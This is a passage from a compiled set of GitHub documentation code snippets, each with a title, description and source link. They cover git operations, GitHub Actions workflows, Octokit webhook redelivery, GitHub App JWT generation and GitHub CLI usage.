(git-credential-osxkeychain)\nDESCRIPTION: This snippet demonstrates how to delete stored credentials for {% data variables.product.product_url %} from the macOS Keychain using the `git credential-osxkeychain erase` command. It requires the user to provide the host and protocol as input. If successful, the command will not produce any output.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/updating-credentials-from-the-macos-keychain.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git credential-osxkeychain erase\nhost={% data variables.product.product_url %}\nprotocol=https\n> [Press Return]\n```\n\n----------------------------------------\n\nTITLE: Handling Octokit.js Responses and Errors\nDESCRIPTION: This code snippet demonstrates how to handle responses and errors when using Octokit.js.  It wraps the `octokit.request` call in a `try/catch` block to catch potential errors. The code logs the status code, remaining rate limit, and error message if the request fails. Replace `REPO-OWNER` and `REPO-NAME` with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\ntry {\n  const result = await octokit.request(\"GET /repos/{owner}/{repo}/issues\", {\n    owner: \"REPO-OWNER\",\n    repo: \"REPO-NAME\",\n    per_page: 2,\n  });\n\n  console.log(`Success! Status: ${result.status}. Rate limit remaining: ${result.headers[\"x-ratelimit-remaining\"]}`)\n\n} catch (error) {\n  console.log(`Error! Status: ${error.status}. Rate limit remaining: ${error.headers[\"x-ratelimit-remaining\"]}. Message: ${error.response.data.message}`)\n}\n```\n\n----------------------------------------\n\nTITLE: Forecasting GitHub Actions Usage\nDESCRIPTION: This command forecasts potential GitHub Actions usage based on completed pipeline runs in GitLab. It computes metrics such as job count, pipeline count, execution time, queue time, and concurrent jobs to help plan for runner capacity and costs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast gitlab --output-dir tmp/forecast --namespace my-gitlab-namespace\n```\n\n----------------------------------------\n\nTITLE: Suggesting a command with GitHub Copilot CLI\nDESCRIPTION: This snippet shows how to use the `gh copilot suggest` command to get a command suggestion based on a natural language query. In this example, the query is \"Undo the last commit\". The GitHub Copilot CLI extension must be installed and configured to use this functionality.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/using-github-copilot-in-the-command-line.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh copilot suggest \"Undo the last commit\"\n```\n\n----------------------------------------\n\nTITLE: Rewording Commits in Interactive Rebase\nDESCRIPTION: This snippet demonstrates how to modify the interactive rebase list by replacing `pick` with `reword` for the commits whose messages you want to change. This indicates to Git that you want to edit the commit message for those commits during the rebase process.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/changing-a-commit-message.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\npick e499d89 Delete CNAME\nreword 0c39034 Better README\nreword f7fde4a Change the commit message but push the same commit.\n```\n\n----------------------------------------\n\nTITLE: Verifying Prometheus metrics exporter - Shell\nDESCRIPTION: This snippet demonstrates how to verify that the Prometheus metrics exporter is enabled by querying the `/metrics` endpoint on port 9103 using `curl`. A successful response will include metrics with the `collectd_` prefix, indicating that the exporter is running and providing data. It depends on the exporter being enabled and accessible on the specified port.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/exporting-and-scraping-prometheus-metrics.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ncurl localhost:9103/metrics\n```\n\n----------------------------------------\n\nTITLE: Mirror-Pushing to a New Repository\nDESCRIPTION: Pushes all branches, tags, and other references to the new repository, effectively mirroring it. This command should be run from within the cloned repository directory.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/duplicating-a-repository.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncd OLD-REPOSITORY\ngit push --mirror https://{% data variables.product.product_url %}/EXAMPLE-USER/NEW-REPOSITORY.git\n```\n\n----------------------------------------\n\nTITLE: Commiting and Pushing Changes to Git in Shell\nDESCRIPTION: This snippet demonstrates how to commit changes with a message using `git commit` and push those changes to the remote repository using `git push`.  This sequence of commands uploads the tracked files to Git LFS and updates the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/configuring-git-large-file-storage.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit commit -m \"add file.psd\"\ngit push\n```\n\n----------------------------------------\n\nTITLE: Initializing Sinatra Server for Webhook Handling (Ruby)\nDESCRIPTION: This snippet initializes a basic Sinatra server endpoint that parses the JSON payload received from a GitHub webhook. It provides a starting point for receiving and processing webhook events. The server listens for POST requests on the `/event_handler` route, parses the `payload` parameter as JSON, and returns a simple success message.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/delivering-deployments.md#_snippet_0\n\nLANGUAGE: Ruby\nCODE:\n```\nrequire 'sinatra'\nrequire 'json'\n\npost '/event_handler' do\n  payload = JSON.parse(params[:payload])\n  \"Well, it worked!\"\nend\n```\n\n----------------------------------------\n\nTITLE: Dry-run with Source File Path for Azure DevOps Pipeline\nDESCRIPTION: This command performs a dry run of migrating an Azure DevOps pipeline using a specified source file path instead of fetching from source control.  It requires the output directory and the file path to the Azure DevOps pipeline definition.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run azure-devops pipeline --output-dir ./output/ --source-file-path ./path/to/azure_devops/pipeline.yml\n```\n\n----------------------------------------\n\nTITLE: ENTRYPOINT example with variable substitution\nDESCRIPTION: This example demonstrates how to use the _exec_ form of the ENTRYPOINT instruction with a shell to enable variable substitution. The shell executes the echo command, which prints the value stored in the GITHUB_SHA environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions.md#_snippet_0\n\nLANGUAGE: dockerfile\nCODE:\n```\nENTRYPOINT [\"sh\", \"-c\", \"echo $GITHUB_SHA\"]\n```\n\n----------------------------------------\n\nTITLE: Starting a Deployment with GitHub API (Ruby)\nDESCRIPTION: This snippet defines the `start_deployment` method, which creates a new deployment using the GitHub API. It constructs a payload with environment and deploy_user information and then calls `@client.create_deployment` with the repository name, commit SHA, payload, and description. It assumes that `@client` is a pre-configured GitHub API client.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/delivering-deployments.md#_snippet_3\n\nLANGUAGE: Ruby\nCODE:\n```\ndef start_deployment(pull_request)\n  user = pull_request['user']['login']\n  payload = JSON.generate(:environment => 'production', :deploy_user => user)\n  @client.create_deployment(pull_request['head']['repo']['full_name'], pull_request['head']['sha'], {:payload => payload, :description => \"Deploying my sweet branch\"})\nend\n```\n\n----------------------------------------\n\nTITLE: Pushing Committed Changes\nDESCRIPTION: This command pushes the local commits to the remote repository. This command assumes the upstream tracking branch has already been configured.  It synchronizes the local branch with the corresponding remote branch.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\ngit push\n```\n\n----------------------------------------\n\nTITLE: Committing Normalized Line Endings\nDESCRIPTION: This snippet commits any outstanding changes after renormalizing line endings, ensuring that the repository reflects the new line ending configuration. It uses a commit message indicating that the line endings have been normalized.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/configuring-git-to-handle-line-endings.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit commit -m \"Normalize all the line endings\"\n```\n\n----------------------------------------\n\nTITLE: Generating Migration Script (GHES 3.7- with AWS S3)\nDESCRIPTION: This snippet demonstrates how to generate a migration script using the `gh gei generate-script` command for GitHub Enterprise Server 3.7 or lower with AWS S3. It requires specifying the AWS bucket name in addition to the standard parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ngh gei generate-script --github-source-org SOURCE \\\n  --github-target-org DESTINATION \\\n  --output FILENAME \\\n  --ghes-api-url GHES-API-URL \\\n  --aws-bucket-name AWS-BUCKET-NAME\n```\n\n----------------------------------------\n\nTITLE: Interactive Rebase Against Branch - Git Shell\nDESCRIPTION: This command initiates an interactive rebase, allowing modification of commits between the current branch and the specified other branch. It opens an editor with a list of commits to be rebased, where you can specify actions like pick, reword, edit, squash, fixup, or exec for each commit. The `OTHER-BRANCH-NAME` placeholder should be replaced with the actual branch name.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-rebase.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit rebase --interactive OTHER-BRANCH-NAME\n```\n\n----------------------------------------\n\nTITLE: Redeliver Failed Webhooks with Octokit\nDESCRIPTION: This JavaScript script retrieves failed webhook deliveries since the last execution, filters duplicates, and redelivers them using the Octokit SDK. It updates a configuration variable to track the last execution time, handling potential errors and logging the number of redeliveries. It relies on environment variables set by the GitHub Actions workflow, such as the GitHub token, organization name, hook ID, and repository information.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/automatically-redelivering-failed-deliveries-for-an-organization-webhook.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// This script uses {% data variables.product.company_short %}'s Octokit SDK to make API requests. For more information, see [AUTOTITLE](/rest/guides/scripting-with-the-rest-api-and-javascript).\nconst { Octokit } = require(\"octokit\");\n\n//\nasync function checkAndRedeliverWebhooks() {\n  // Get the values of environment variables that were set by the {% data variables.product.prodname_actions %} workflow.\n  const TOKEN = process.env.TOKEN;\n  const ORGANIZATION_NAME = process.env.ORGANIZATION_NAME;\n  const HOOK_ID = process.env.HOOK_ID;\n  const LAST_REDELIVERY_VARIABLE_NAME = process.env.LAST_REDELIVERY_VARIABLE_NAME;\n  {% ifversion ghes %}const HOSTNAME = process.env.HOSTNAME;{% endif %}\n  const WORKFLOW_REPO_NAME = process.env.WORKFLOW_REPO_NAME;\n  const WORKFLOW_REPO_OWNER = process.env.WORKFLOW_REPO_OWNER;\n\n  // Create an instance of `Octokit` using the token{% ifversion ghes %} and hostname{% endif %} values that were set in the {% data variables.product.prodname_actions %} workflow.\n  const octokit = new Octokit({ {% ifversion ghes %}\n    baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n    auth: TOKEN,\n  });\n\n  try {\n    // Get the last time that this script ran from the configuration variable. If the variable is not defined, use the current time minus 24 hours.\n    const lastStoredRedeliveryTime = await getVariable({\n      variableName: LAST_REDELIVERY_VARIABLE_NAME,\n      repoOwner: WORKFLOW_REPO_OWNER,\n      repoName: WORKFLOW_REPO_NAME,\n      octokit,\n    });\n    const lastWebhookRedeliveryTime = lastStoredRedeliveryTime || (Date.now() - (24 * 60 * 60 * 1000)).toString();\n\n    // Record the time that this script started redelivering webhooks.\n    const newWebhookRedeliveryTime = Date.now().toString();\n\n    // Get the webhook deliveries that were delivered after `lastWebhookRedeliveryTime`.\n    const deliveries = await fetchWebhookDeliveriesSince({\n      lastWebhookRedeliveryTime,\n      organizationName: ORGANIZATION_NAME,\n      hookId: HOOK_ID,\n      octokit,\n    });\n\n    // Consolidate deliveries that have the same globally unique identifier (GUID). The GUID is constant across redeliveries of the same delivery.\n    let deliveriesByGuid = {};\n    for (const delivery of deliveries) {\n      deliveriesByGuid[delivery.guid]\n        ? deliveriesByGuid[delivery.guid].push(delivery)\n        : (deliveriesByGuid[delivery.guid] = [delivery]);\n    }\n\n    // For each GUID value, if no deliveries for that GUID have been successfully delivered within the time frame, get the delivery ID of one of the deliveries with that GUID.\n    //\n    // This will prevent duplicate redeliveries if a delivery has failed multiple times.\n    // This will also prevent redelivery of failed deliveries that have already been successfully redelivered.\n    let failedDeliveryIDs = [];\n    for (const guid in deliveriesByGuid) {\n      const deliveries = deliveriesByGuid[guid];\n      const anySucceeded = deliveries.some(\n        (delivery) => delivery.status === \"OK\"\n      );\n      if (!anySucceeded) {\n        failedDeliveryIDs.push(deliveries[0].id);\n      }\n    }\n\n    // Redeliver any failed deliveries.\n    for (const deliveryId of failedDeliveryIDs) {\n      await redeliverWebhook({\n        deliveryId,\n        organizationName: ORGANIZATION_NAME,\n        hookId: HOOK_ID,\n        octokit,\n      });\n    }\n\n    // Update the configuration variable (or create the variable if it doesn't already exist) to store the time that this script started.\n    // This value will be used next time this script runs.\n    await updateVariable({\n      variableName: LAST_REDELIVERY_VARIABLE_NAME,\n      value: newWebhookRedeliveryTime,\n      variableExists: Boolean(lastStoredRedeliveryTime),\n      repoOwner: WORKFLOW_REPO_OWNER,\n      repoName: WORKFLOW_REPO_NAME,\n      octokit,\n    });\n\n    // Log the number of redeliveries.\n    console.log(\n      `Redelivered ${\n        failedDeliveryIDs.length\n      } failed webhook deliveries out of ${\n        deliveries.length\n      } total deliveries since ${Date(lastWebhookRedeliveryTime)}.`\n    );\n  } catch (error) {\n    // If there was an error, log the error so that it appears in the workflow run log, then throw the error so that the workflow run registers as a failure.\n    if (error.response) {\n      console.error(\n        `Failed to check and redeliver webhooks: ${error.response.data.message}`\n      );\n    }\n    console.error(error);\n    throw(error);\n  }\n}\n\n// This function will fetch all of the webhook deliveries that were delivered since `lastWebhookRedeliveryTime`.\n// It uses the `octokit.paginate.iterator()` method to iterate through paginated results. For more information, see [AUTOTITLE](/rest/guides/scripting-with-the-rest-api-and-javascript#making-paginated-requests).\n//\n// If a page of results includes deliveries that occurred before `lastWebhookRedeliveryTime`,\n// it will store only the deliveries that occurred after `lastWebhookRedeliveryTime` and then stop.\n// Otherwise, it will store all of the deliveries from the page and request the next page.\nasync function fetchWebhookDeliveriesSince({\n  lastWebhookRedeliveryTime,\n  organizationName,\n  hookId,\n  octokit,\n}) {\n  const iterator = octokit.paginate.iterator(\n    \"GET /orgs/{org}/hooks/{hook_id}/deliveries\",\n    {\n      org: organizationName,\n      hook_id: hookId,\n      per_page: 100,\n      headers: {\n        \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n      },\n    }\n  );\n\n  const deliveries = [];\n\n  for await (const { data } of iterator) {\n    const oldestDeliveryTimestamp = new Date(\n      data[data.length - 1].delivered_at\n    ).getTime();\n\n    if (oldestDeliveryTimestamp < lastWebhookRedeliveryTime) {\n      for (const delivery of data) {\n        if (\n          new Date(delivery.delivered_at).getTime() > lastWebhookRedeliveryTime\n        ) {\n          deliveries.push(delivery);\n        } else {\n          break;\n        }\n      }\n      break;\n    } else {\n      deliveries.push(...data);\n    }\n  }\n\n  return deliveries;\n}\n\n// This function will redeliver a failed webhook delivery.\nasync function redeliverWebhook({\n  deliveryId,\n  organizationName,\n  hookId,\n  octokit,\n}) {\n  await octokit.request(\n    \"POST /orgs/{org}/hooks/{hook_id}/deliveries/{delivery_id}/attempts\",\n    {\n      org: organizationName,\n      hook_id: hookId,\n      delivery_id: deliveryId,\n    }\n  );\n}\n\n// This function gets the value of a configuration variable.\n// If the variable does not exist, the endpoint returns a 404 response and this function returns `undefined`.\nasync function getVariable({ variableName, repoOwner, repoName, octokit }) {\n  try {\n    const {\n      data: { value },\n    } = await octokit.request(\n      \"GET /repos/{owner}/{repo}/actions/variables/{name}\",\n      {\n        owner: repoOwner,\n        repo: repoName,\n        name: variableName,\n      }\n    );\n    return value;\n  } catch (error) {\n    if (error.status === 404) {\n      return undefined;\n    } else {\n      throw error;\n    }\n  }\n}\n\n// This function will update a configuration variable (or create the variable if it doesn't already exist). For more information, see [AUTOTITLE](/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows).\nasync function updateVariable({\n  variableName,\n  value,\n  variableExists,\n  repoOwner,\n  repoName,\n  octokit,\n}) {\n  if (variableExists) {\n    await octokit.request(\n      \"PATCH /repos/{owner}/{repo}/actions/variables/{name}\",\n      {\n        owner: repoOwner,\n        repo: repoName,\n        name: variableName,\n        value: value,\n      }\n    );\n  } else {\n    await octokit.request(\"POST /repos/{owner}/{repo}/actions/variables\", {\n      owner: repoOwner,\n      repo: repoName,\n      name: variableName,\n      value: value,\n    });\n  }\n}\n\n// This will execute the `checkAndRedeliverWebhooks` function.\n(async () => {\n  await checkAndRedeliverWebhooks();\n})();\n\n```\n\n----------------------------------------\n\nTITLE: Disabling Dependency Graph via SSH Shell\nDESCRIPTION: This command disables the dependency graph on GitHub Enterprise Server via the administrative shell (SSH). It requires SSH access to the instance. It uses `ghe-config` to set the `app.dependency-graph.enabled` configuration option to `false`. No specific output is expected, but the changes will take effect after applying the configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-github-advanced-security-for-your-enterprise/enabling-github-advanced-security-for-your-enterprise.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.dependency-graph.enabled false\n```\n\n----------------------------------------\n\nTITLE: Setting workflow-level id-token permission in GitHub Actions YAML\nDESCRIPTION: This YAML snippet demonstrates how to set the `id-token` permission to `write` at the workflow level in a GitHub Actions workflow file. This is necessary for requesting a JSON Web Token (JWT) from GitHub's OIDC provider. The `contents: read` permission is also included as it's commonly required by the `actions/checkout` action.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/oidc-permissions-token.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout\n```\n\n----------------------------------------\n\nTITLE: Pulling container image by digest - Docker CLI\nDESCRIPTION: This command pulls a container image from the GitHub Container Registry using its digest SHA value. Replace `NAMESPACE` with the account or organization name, `IMAGE_NAME` with the image name, and `YOUR_SHA_VALUE` with the actual SHA digest. This ensures you get the exact version of the image.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ndocker pull {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME@sha256:82jf9a84u29hiasldj289498uhois8498hjs29hkuhs\n```\n\n----------------------------------------\n\nTITLE: Restoring NuGet Packages\nDESCRIPTION: This command restores NuGet packages defined in the .csproj file. The `dotnet restore` command downloads and installs the dependencies specified in the project file.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\ndotnet restore\n```\n\n----------------------------------------\n\nTITLE: Generating JWT with Python\nDESCRIPTION: This Python code snippet demonstrates how to generate a JWT for a GitHub App. It requires the `PyJWT` and `cryptography` packages. It takes the PEM file path and App/Client ID as arguments (or prompts for input), reads the private key, constructs the JWT payload with the required claims (iat, exp, iss), and encodes the JWT using the RS256 algorithm.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-json-web-token-jwt-for-a-github-app.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n#!/usr/bin/env python3\nimport sys\nimport time\n\nimport jwt\n\n\n# Get PEM file path\nif len(sys.argv) > 1:\n    pem = sys.argv[1]\nelse:\n    pem = input(\"Enter path of private PEM file: \")\n\n{% ifversion client-id-for-app %}\n# Get the Client ID\nif len(sys.argv) > 2:\n    client_id = sys.argv[2]\nelse:\n    client_id = input(\"Enter your Client ID: \")\n{% else %}\n# Get the App ID\nif len(sys.argv) > 2:\n    app_id = sys.argv[2]\nelse:\n    app_id = input(\"Enter your APP ID: \")\n{% endif %}\n\n# Open PEM\nwith open(pem, 'rb') as pem_file:\n    signing_key = pem_file.read()\n\npayload = {\n    # Issued at time\n    'iat': int(time.time()),\n    # JWT expiration time (10 minutes maximum)\n    'exp': int(time.time()) + 600,\n    {% ifversion client-id-for-app %}\n    # {% data variables.product.prodname_github_app %}'s client ID\n    'iss': client_id{% else %}\n    # {% data variables.product.prodname_github_app %}'s app ID\n    'iss': app_id{% endif %}\n}\n\n# Create JWT\nencoded_jwt = jwt.encode(payload, signing_key, algorithm='RS256')\n\nprint(f\"JWT: {encoded_jwt}\")\n```\n\n----------------------------------------\n\nTITLE: Updating a Single Select Field using GraphQL with gh\nDESCRIPTION: This snippet demonstrates how to update a single select field for a project item using the GitHub CLI (`gh`) and GraphQL. It requires replacing `PROJECT_ID`, `ITEM_ID`, `FIELD_ID`, and `OPTION_ID` with the appropriate values. The `gh` CLI handles authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_24\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  mutation {\\n    updateProjectV2ItemFieldValue(\\n      input: {\\n        projectId: \"PROJECT_ID\"\\n        itemId: \"ITEM_ID\"\\n        fieldId: \"FIELD_ID\"\\n        value: {\\n          singleSelectOptionId: \"OPTION_ID\"\\n        }\\n      }\\n    ) {\\n      projectV2Item {\\n        id\\n      }\\n    }\\n  }'\n```\n\n----------------------------------------\n\nTITLE: REST API Security Review Prompt File Example\nDESCRIPTION: This prompt file provides reusable information about security practices for REST APIs. It can be used to conduct security reviews of REST APIs and includes instructions to ensure authentication, authorization, input validation, rate limiting, and logging.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/customizing-copilot/adding-repository-custom-instructions-for-github-copilot.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nSecure REST API review:\n- Ensure all endpoints are protected by authentication and authorization\n- Validate all user inputs and sanitize data\n- Implement rate limiting and throttling\n- Implement logging and monitoring for security events\n…\n```\n\n----------------------------------------\n\nTITLE: Finding Available Machine Types with GitHub CLI\nDESCRIPTION: This command uses the GitHub CLI to query the GitHub API and retrieve a list of available machine types for a specific codespace. The `CODESPACE-NAME` placeholder should be replaced with the actual name of the codespace.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-machine-type-for-your-codespace.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh api /user/codespaces/CODESPACE-NAME/machines\n```\n\n----------------------------------------\n\nTITLE: Linking Separate Build and Deploy Jobs\nDESCRIPTION: This snippet demonstrates linking separate build and deploy jobs in a single workflow file. It defines `build` and `deploy` jobs under the `jobs` section, with the `deploy` job depending on the `build` job via the `needs` parameter. The `build` job sets up pages, builds with Jekyll, and uploads the artifact.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/getting-started-with-github-pages/using-custom-workflows-with-github-pages.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\n# ...\n\njobs:\n  # Build job\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Pages\n        id: pages\n        uses: actions/configure-pages@v5\n      - name: Build with Jekyll\n        uses: actions/jekyll-build-pages@v1\n        with:\n          source: ./\n          destination: ./_site\n      - name: Upload artifact\n{%- ifversion fpt or ghec %}\n        uses: actions/upload-pages-artifact@v3\n{%- elsif ghes %}\n        uses: actions/upload-pages-artifact@v2\n{%- endif %}\n\n  # Deployment job\n  deploy:\n    environment:\n      name: github-pages\n      url: {% raw %}${{steps.deployment.outputs.page_url}}{% endraw %}\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Deploy to GitHub Pages\n        id: deployment\n{%- ifversion fpt or ghec %}\n        uses: actions/deploy-pages@v4\n{%- elsif ghes %}\n        uses: actions/deploy-pages@v3\n{%- endif %}\n# ...\n```\n\n----------------------------------------\n\nTITLE: Checking Network Connectivity with config.cmd - PowerShell\nDESCRIPTION: This PowerShell command uses the `config.cmd` script with the `--check` parameter to verify that a self-hosted runner can access required network services. It requires the `--url` parameter for the repository and `--pat` parameter with a personal access token with `workflow` scope or a fine-grained personal access token with workflows read and write access. It is to be executed on a Windows runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nconfig.cmd --check --url https://github.com/YOUR-ORG/YOUR-REPO --pat GHP_ABCD1234\n```\n\n----------------------------------------\n\nTITLE: Generating a new SSH key for a hardware security key - macOS - Shell\nDESCRIPTION: This command generates a new SSH key specifically for a hardware security key using the ed25519-sk algorithm and associates it with the provided email address.  It requires a hardware security key inserted into the computer.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\nssh-keygen -t ed25519-sk -C \"your_email@example.com\"\n```\n\n----------------------------------------\n\nTITLE: Ignoring Semantic Versioning Levels - YAML\nDESCRIPTION: This snippet shows how to ignore semantic versioning (SemVer) levels using the `update-types` option in the `dependabot.yml` file.  Specifically, it ignores patch versions for Node.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"daily\"\n    ignore:\n      - dependency-name: \"express\"\n        # For Express, ignore all updates for version 4 and 5\n        versions: [\"4.x\", \"5.x\"]\n        # For Lodash, ignore all updates\n      - dependency-name: \"lodash\"\n      - dependency-name: \"@types/node\"\n        # For Node types, ignore any patch versions\n        update-types: [\"version-update:semver-patch\"]\n```\n\n----------------------------------------\n\nTITLE: Deploying to Azure Static Web Apps with GitHub Actions (YAML)\nDESCRIPTION: This workflow automates the build and deployment of an Azure Static Web App upon pushes to the `main` branch or pull requests targeting `main`. It also handles the teardown of pre-production deployments when a pull request is closed. Key parameters such as `APP_LOCATION`, `API_LOCATION`, and `OUTPUT_LOCATION` need to be configured to match the project structure.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-azure-static-web-app.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Deploy web app to Azure Static Web Apps\n\nenv:\n  APP_LOCATION: \"/\" # location of your client code\n  API_LOCATION: \"api\" # location of your api source code - optional\n  OUTPUT_LOCATION: \"build\" # location of client code build output\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    types: [opened, synchronize, reopened, closed]\n    branches:\n      - main\n\npermissions:\n  issues: write\n  contents: read\n  pull-requests: write\n\njobs:\n  build_and_deploy:\n    if: github.event_name == 'push' || (github.event_name == 'pull_request' && github.event.action != 'closed')\n    runs-on: ubuntu-latest\n    name: Build and Deploy\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n        with:\n          submodules: true\n      - name: Build And Deploy\n        uses: Azure/static-web-apps-deploy@1a947af9992250f3bc2e68ad0754c0b0c11566c9\n        with:\n          azure_static_web_apps_api_token: {% raw %}${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}{% endraw %}\n          repo_token: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          action: \"upload\"\n          app_location: {% raw %}${{ env.APP_LOCATION }}{% endraw %}\n          api_location: {% raw %}${{ env.API_LOCATION }}{% endraw %}\n          output_location: {% raw %}${{ env.OUTPUT_LOCATION }}{% endraw %}\n\n  close_pull_request:\n    if: github.event_name == 'pull_request' && github.event.action == 'closed'\n    runs-on: ubuntu-latest\n    name: Close Pull Request\n    steps:\n      - name: Close Pull Request\n        uses: Azure/static-web-apps-deploy@1a947af9992250f3bc2e68ad0754c0b0c11566c9\n        with:\n          azure_static_web_apps_api_token: {% raw %}${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}{% endraw %}\n          action: \"close\"\n\n```\n\n----------------------------------------\n\nTITLE: Path Qualifier with Directory and Glob\nDESCRIPTION: This snippet demonstrates searching for JavaScript files within a `src` directory using a glob expression in the `path:` qualifier.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_16\n\nLANGUAGE: text\nCODE:\n```\npath:src/*.js\n```\n\n----------------------------------------\n\nTITLE: Defining Specific GITHUB_TOKEN Permissions in YAML\nDESCRIPTION: This YAML snippet shows how to define granular permissions for the GITHUB_TOKEN. Each permission can be set to `read`, `write`, or `none`.  If a permission is not explicitly set, it defaults to `none`.  This configuration allows fine-grained control over the token's access.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/github-token-available-permissions.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\npermissions:\n  actions: read|write|none{% ifversion artifact-attestations %}\n  attestations: read|write|none{% endif %}\n  checks: read|write|none\n  contents: read|write|none\n  deployments: read|write|none{% ifversion fpt or ghec %}\n  id-token: write|none{% endif %}\n  issues: read|write|none{% ifversion not ghes %}\n  models: read|none{% endif %}\n  discussions: read|write|none\n  packages: read|write|none\n  pages: read|write|none\n  pull-requests: read|write|none{% ifversion projects-v1 %}\n  repository-projects: read|write|none{% endif %}\n  security-events: read|write|none\n  statuses: read|write|none\n```\n\n----------------------------------------\n\nTITLE: Installing npm packages (Shell)\nDESCRIPTION: This snippet shows the command to install the dependencies listed in the `package.json` file. This command will install all packages listed in dependencies, devDependencies, and peerDependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nnpm install\n```\n\n----------------------------------------\n\nTITLE: GitLab CI/CD Job Syntax\nDESCRIPTION: This YAML snippet demonstrates the syntax for defining a job in GitLab CI/CD. It includes setting a variable and defining a script to be 